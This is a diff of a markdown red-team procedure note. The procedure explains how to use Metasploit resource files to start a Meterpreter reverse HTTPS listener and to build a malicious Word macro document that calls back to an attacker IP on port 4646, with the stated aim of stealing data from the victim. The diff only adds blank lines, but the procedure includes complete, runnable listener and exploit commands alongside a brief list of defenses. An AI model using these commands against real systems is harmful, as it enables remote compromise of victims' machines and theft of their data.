@@ -45,6 +45,8 @@ Technical Explanation: After configuring the shell settings, the attacker can ex
 
 Business Value: This procedure can be used by red teams to test the effectiveness of their organization's defenses against post-exploitation attacks. By automating post-exploitation tasks with Meterpreter, red teams can simulate real-world attacks and provide valuable feedback to the organization's security team.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable machine
@@ -55,6 +57,8 @@ Business Value: This procedure can be used by red teams to test the effectivenes
 
 1. Metasploit Framework installed on the attacker's machine
 
+ 
+
 ## Defense
 
 1. Implement strong authentication mechanisms to prevent unauthorized access to vulnerable machines
@@ -62,6 +66,8 @@ Business Value: This procedure can be used by red teams to test the effectivenes
 1. Monitor network traffic for suspicious activity, such as the delivery of Meterpreter payloads
 
 1. Deploy endpoint protection solutions to detect and prevent the execution of malicious macros
+
+ 
 
 ## Objectives
 
@@ -71,13 +77,23 @@ Business Value: This procedure can be used by red teams to test the effectivenes
 
 1. Steal sensitive data from the victim's machine
 
+ 
+
 # Instructions
 
 1. Modify the .rc file
 
+ 
+
+
+
 **Code**: [[.rc file]]
 
+
+
 > The .rc file is a shell script that is executed whenever a new shell is started. It is used to configure various shell settings such as aliases, environment variables, and shell options. To modify the .rc file, simply open it in a text editor and add or remove the desired settings. The changes will take effect the next time a new shell is started.
+
+
 
 **Command** ([[Create .rc file]]):
 
@@ -85,17 +101,31 @@ Business Value: This procedure can be used by red teams to test the effectivenes
 touch ~/.bashrc
 ```
 
+
+
+
+
 **Command** ([[Edit .rc file]]):
 
 ```bash
 nano ~/.bashrc
 ```
 
+
+
 2. Create a file with Metasploit commands and save it with the .rc extension. Then, use this command to execute the commands from the file.
+
+ 
+
+
 
 **Code**: [[msfconsole -r ./file.rc]]
 
+
+
 > The 'msfconsole' command is used to launch the Metasploit Framework console. The '-r' option specifies the file containing the commands to execute. This command is useful when you have a large number of commands to run and don't want to manually enter them one by one. The file should contain one command per line. Once the file is created, simply pass the path to the file as an argument to the '-r' option and Metasploit will execute the commands in the file.
+
+
 
 **Command** ([[Run Metasploit Framework Console with Resource File]]):
 
@@ -103,14 +133,25 @@ nano ~/.bashrc
 msfconsole -r ./file.rc
 ```
 
+
+
 3. This command is used to exploit a vulnerability in Microsoft Word's macro feature to execute a Windows Meterpreter reverse HTTPS payload. The command sets the payload, local host and port, and whether or not to exit the session upon completion. The exploit is then executed in the background (-j) and without user interaction (-z).
+
+
+ 
+
+
 
 **Code**: [[use exploit/multi/handler
 set PAYLOAD windows/mete]]
 
+
+
 > The 'use exploit/multi/handler' command sets up the exploit handler on the attacker's machine. The 'set PAYLOAD windows/meterpreter/reverse_https' command sets the type of payload to be used. The 'set LHOST 0.0.0.0' command sets the local host to listen on all available interfaces. The 'set LPORT 4646' command sets the local port to listen on. The 'set ExitOnSession false' command tells the exploit handler to keep running after a session is created. The 'exploit -j -z' command executes the exploit in the background and without user interaction.
 
 The 'use exploit/multi/fileformat/office_word_macro' command sets up the Microsoft Word macro exploit. The 'set PAYLOAD windows/meterpreter/reverse_https' command sets the type of payload to be used. The 'set LHOST 10.10.14.22' command sets the attacker's IP address. The 'set LPORT 4646' command sets the port for the reverse shell connection. The 'exploit' command runs the exploit and connects back to the attacker's machine.
+
+
 
 **Command** ([[Start Metasploit listener]]):
 
@@ -123,6 +164,10 @@ set ExitOnSession false
 exploit -j -z
 ```
 
+
+
+
+
 **Command** ([[Execute Word Macro exploit]]):
 
 ```bash
@@ -132,6 +177,8 @@ set LHOST 10.10.14.22
 set LPORT 4646
 exploit
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -165,3 +212,5 @@ exploit
 
 - [[Metasploit]]
 - [[Scripting Metasploit]]
+
+
